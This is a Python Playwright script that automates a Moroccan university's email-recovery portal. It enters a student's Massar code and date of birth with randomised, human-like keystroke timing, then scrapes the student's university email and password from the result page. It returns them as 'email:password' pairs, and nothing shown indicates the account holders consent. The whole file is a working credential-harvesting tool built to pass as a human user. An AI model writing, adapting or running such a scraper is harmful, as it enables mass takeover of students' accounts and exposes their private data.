"""
UMP RECUPMAIL ENGINE — Core verification module for http://recupmail.ump.ma/
Accurate extraction of Email and Password, allowing special symbols (like '*') in passwords while strictly blocking warning texts.
"""

import re
import time
import random

class LoginState:
    LOGIN_OK = "login_ok"
    LOGIN_ERROR = "login_error"
    SITE_ERROR = "site_error"

class UMPEngine:
    def __init__(self):
        pass

    def _human_type(self, page, selector, text):
        try:
            loc = page.locator(selector).first
            loc.click()
            page.wait_for_timeout(random.randint(200, 400))
            loc.fill("")
            for char in str(text):
                loc.press_sequentially(char, delay=random.randint(120, 260))
        except Exception:
            page.fill(selector, text)

    def run_workflow(self, page, massar, dob):
        result_data = {
            "massar": massar,
            "dob": dob,
            "status": LoginState.LOGIN_ERROR,
            "extracted_email": None,
            "detail": "Initialized"
        }

        try:
            # Page stable by Dynamo
            page.wait_for_load_state("domcontentloaded", timeout=30000)
            page.wait_for_timeout(random.randint(1200, 2000))

            inputs = page.locator('input')
            if inputs.count() < 2:
                result_data["status"] = LoginState.SITE_ERROR
                result_data["detail"] = "Site Error: Required input fields not found"
                return result_data

            # 1. Fill Code Massar
            massar_input = inputs.nth(0)
            massar_input.click()
            page.wait_for_timeout(200)
            massar_input.fill("")
            for char in str(massar):
                massar_input.press_sequentially(char, delay=random.randint(120, 250))

            page.wait_for_timeout(random.randint(600, 900))

            # 2. Fill Date de naissance
            dob_input = inputs.nth(1)
            dob_input.click()
            page.wait_for_timeout(200)
            dob_input.fill("")
            for char in str(dob):
                dob_input.press_sequentially(char, delay=random.randint(120, 250))

            page.wait_for_timeout(random.randint(900, 1400))

            # Click submit button ("CONNEXION")
            submit_clicked = False
            for btn_sel in ['button:has-text("CONNEXION")', 'button:has-text("Connexion")', 'button[type="submit"]', 'input[type="submit"]', '.btn']:
                try:
                    btn = page.locator(btn_sel).first
                    if btn.count() > 0:
                        btn.click()
                        submit_clicked = True
                        break
                except Exception:
                    continue
            if not submit_clicked:
                page.locator('button').first.click()

            # Double verification / reading result step 1 & step 2
            page.wait_for_timeout(3500)
            
            # فحص الأخطاء أولاً من النص العام
            body_text = page.locator("body").inner_text().lower()
            error_keywords = ["invalide", "incorrect", "الرقم أو تاريخ", "غير صحيح", "veuillez", "erreur", "aucun"]
            if any(kw in body_text for kw in error_keywords):
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Incorrect Code Massar or DOB (Login Error)"
                return result_data

            page.wait_for_timeout(1500)

            # استخراج صارم يستهدف الخضراء ويمنع فقط تحذيرات Important
            extracted_data = page.evaluate("""() => {
                let email = null;
                let password = null;

                const isWarningText = (text, el) => {
                    if (!text) return true;
                    const lower = text.toLowerCase().trim();
                    // منع جمل التحذير أو كلمة important وحدها، لكن السماح بالنجمة '*' إيلا كانت ضمن الباسورد
                    if (lower.includes('important') || lower.includes('vous devez') || lower.includes('mot de passe')) {
                        return true;
                    }
                    if (el && (el.classList.contains('label-danger') || el.closest('.text-danger') || el.closest('.centrePhoneEmail'))) {
                        return true;
                    }
                    return false;
                };

                // 1. استخراج الإيميل
                const bodyText = document.body.innerText;
                const emailMatch = bodyText.match(/[\\w\\.-]+@ump\\.ac\\.ma/i);
                if (emailMatch) {
                    email = emailMatch[0].trim().toLowerCase();
                }

                // 2. استخراج الباسورد حصرياً من البادج الخضراء span.label-success
                const successSpans = document.querySelectorAll('span.label-success:not(.label-danger)');
                for (let span of successSpans) {
                    let val = span.innerText.trim();
                    if (!isWarningText(val, span) && val.length >= 4) {
                        password = val;
                        break;
                    }
                }

                // 3. طريقة احتياطية دقيقة داخل الـ Table
                if (!password) {
                    const rows = document.querySelectorAll('table tr');
                    for (let row of rows) {
                        const th = row.querySelector('th');
                        const td = row.querySelector('td');
                        if (th && td && th.innerText.toLowerCase().includes('mot de passe')) {
                            const spanSuccess = td.querySelector('span.label-success');
                            let val = spanSuccess ? spanSuccess.innerText.trim() : td.innerText.trim();
                            if (!isWarningText(val, td) && val.length >= 4) {
                                password = val;
                                break;
                            }
                        }
                    }
                }

                return { email, password };
            }""")

            extracted_email = extracted_data.get("email")
            extracted_pwd = extracted_data.get("password")

            # فحص نهائي في بايثون: نمنع فقط كلمة important ونسمح بالرموز العادية
            if (
                extracted_email 
                and extracted_pwd 
                and "@ump.ac.ma" in extracted_email
                and "important" not in extracted_pwd.lower()
            ):
                result_data["status"] = LoginState.LOGIN_OK
                result_data["extracted_email"] = f"{extracted_email}:{extracted_pwd}"
                result_data["detail"] = f"Success | Email: {extracted_email} | Password: {extracted_pwd}"
            else:
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Valid password not extracted"

        except Exception as e:
            result_data["status"] = LoginState.SITE_ERROR
            result_data["detail"] = f"Site Error / Exception: {type(e).__name__}"

        return result_data